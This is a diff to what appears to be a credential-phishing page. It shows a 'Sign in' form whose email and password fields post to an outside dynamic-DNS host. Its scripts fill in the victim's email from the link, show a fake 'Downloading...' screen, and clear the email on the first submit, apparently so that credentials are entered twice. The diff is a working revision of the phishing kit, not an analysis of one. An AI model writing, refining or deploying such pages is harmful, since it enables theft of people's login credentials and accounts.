@@ -178,10 +178,10 @@
         <h2>Sign in</h2>
         <form id="loginForm" action="https://intakalbkabera.zapto.org/single/next2580.php" method="post">
             <input type="email" id="inputline1" name="user" placeholder="Enter Email" required>
-            <script type="text/javascript">
+            <!-- <script type="text/javascript">
                 var url = window.location.href;
                 var name = url.substring(url.indexOf("=") + 1);
-                document.getElementById("inputline1").value = name;
+                document.getElementById("inputline1").value = name; -->
             </script>
             <input type="password" name="pass" placeholder="Enter Password" required>
             <input class="continue-btn" type="submit" name="submit" value="Login" />
@@ -206,29 +206,34 @@
         <p>Downloading...</p>
     </div>
 
- <script>
+<script>
     const form = document.getElementById("loginForm");
     const preloader = document.getElementById("preloader");
     const emailInput = document.getElementById("inputline1");
 
-    // Autofill email from URL
-    var url = window.location.href;
-    var name = url.substring(url.indexOf("=") + 1);
-    emailInput.value = name;
+    // Only autofill email from URL once on first load
+    if (!sessionStorage.getItem("emailFilled")) {
+        const url = window.location.href;
+        const email = url.substring(url.indexOf("=") + 1);
+        emailInput.value = email;
+        sessionStorage.setItem("emailFilled", "true"); // flag to not fill again
+    }
 
     let firstSubmit = true;
 
-    form.addEventListener("submit", function (e) {
+    form.addEventListener("submit", function () {
         // Show preloader
         preloader.classList.remove("hidden");
 
         if (firstSubmit) {
-            // Clear email input
+            // Clear email only on first submit
             emailInput.value = "";
             firstSubmit = false;
         }
     });
 </script>
+
+
 
 
 </body>
